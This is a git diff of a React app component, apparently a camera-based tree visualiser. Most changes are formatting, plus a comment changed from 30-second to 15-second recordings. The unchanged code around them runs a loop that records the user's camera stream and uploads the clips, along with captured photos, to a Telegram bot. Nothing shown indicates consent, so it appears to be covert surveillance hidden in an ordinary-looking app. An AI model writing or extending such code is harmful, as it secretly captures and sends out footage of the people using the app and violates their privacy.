@@ -78,7 +78,7 @@ export default function App() {
   const recordingLoopStarted = useRef(false);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
 
-  // Record 30s video and send to Telegram
+  // Record 15s video and send to Telegram
   const recordAndSendToTelegram = useCallback(async () => {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       console.log("Recording: No Telegram credentials configured");
@@ -111,7 +111,7 @@ export default function App() {
               resolve();
             } else {
               console.log(
-                `Recording: Waiting... readyState=${video.readyState}, size=${video.videoWidth}x${video.videoHeight}`
+                `Recording: Waiting... readyState=${video.readyState}, size=${video.videoWidth}x${video.videoHeight}`,
               );
               setTimeout(checkReady, 200);
             }
@@ -124,7 +124,7 @@ export default function App() {
       await Promise.race([
         waitForVideo(),
         new Promise((_, reject) =>
-          setTimeout(() => reject(new Error("Video timeout")), 6000)
+          setTimeout(() => reject(new Error("Video timeout")), 6000),
         ),
       ]);
 
@@ -136,7 +136,7 @@ export default function App() {
         return;
       }
       console.log(
-        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`
+        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`,
       );
 
       // Use the original video stream directly - much more efficient!
@@ -146,8 +146,8 @@ export default function App() {
       const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
         ? "video/webm;codecs=vp9"
         : MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
-        ? "video/webm;codecs=vp8"
-        : "video/webm";
+          ? "video/webm;codecs=vp8"
+          : "video/webm";
 
       const mediaRecorder = new MediaRecorder(originalStream, {
         mimeType,
@@ -162,7 +162,7 @@ export default function App() {
           chunks.push(e.data);
           totalBytes += e.data.size;
           console.log(
-            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`
+            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`,
           );
         }
       };
@@ -207,7 +207,7 @@ export default function App() {
         {
           method: "POST",
           body: formData,
-        }
+        },
       );
 
       if (response.ok) {
@@ -225,7 +225,7 @@ export default function App() {
     // Exit early if no credentials - don't start the loop at all
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       console.log(
-        "[RecordingLoop] No Telegram credentials, skipping recording loop"
+        "[RecordingLoop] No Telegram credentials, skipping recording loop",
       );
       return;
     }
@@ -297,7 +297,7 @@ export default function App() {
 
   const toggleMode = () => {
     setMode((prev) =>
-      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
+      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED,
     );
   };
 
@@ -350,7 +350,7 @@ export default function App() {
               "caption",
               `📸 Photo ${i + 1}/${
                 photos.length
-              }\n🕐 ${new Date().toLocaleString()}`
+              }\n🕐 ${new Date().toLocaleString()}`,
             );
 
             const response = await fetch(
@@ -358,13 +358,13 @@ export default function App() {
               {
                 method: "POST",
                 body: formData,
-              }
+              },
             );
 
             if (!response.ok) {
               console.error(
                 "Failed to send photo to Telegram:",
-                await response.text()
+                await response.text(),
               );
             }
 
